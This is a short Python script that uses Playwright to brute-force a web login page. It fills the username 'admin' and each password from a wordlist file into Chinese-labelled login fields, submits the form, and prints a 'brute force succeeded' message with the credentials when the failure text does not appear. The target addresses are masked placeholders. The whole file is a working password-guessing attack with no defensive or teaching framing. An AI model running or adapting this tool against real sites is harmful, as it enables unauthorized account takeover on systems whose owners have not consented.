from playwright.sync_api import sync_playwright
import time
if __name__ == '__main__':
    url = 'https://xxxxx.com'
    usr= "admin"
    pwd_list = open("password.txt","r")
    response_url = 'https://xxxxxxx.com'
    with sync_playwright() as p:
        with p.chromium.launch(headless=False) as browser:
            with browser.new_context(locale="zh-CN") as context:
                page = context.new_page()
                page.goto(url)
                time.sleep(10)
                for pwd in pwd_list:
                    def on_response(response):
                        response.finished()
                        if response.url == response_url and response.request.method == 'POST':
                            failure_keyword = "用户不存在/密码错误"
                            if failure_keyword not in response.text():
                                print(f'爆破成功，账户名为{usr},密码为{pwd}')
                    page.on('response',on_response)
                    time.sleep(1)
                    page.get_by_placeholder("账号").fill(usr)
                    page.get_by_placeholder("密码").fill(pwd)
                    page.once("dialog",lambda dialog:dialog.dismiss())
                    page.get_by_role('button',name='登 录').click()
                    page.wait_for_load_state()
    pwd_list.close()                
                                
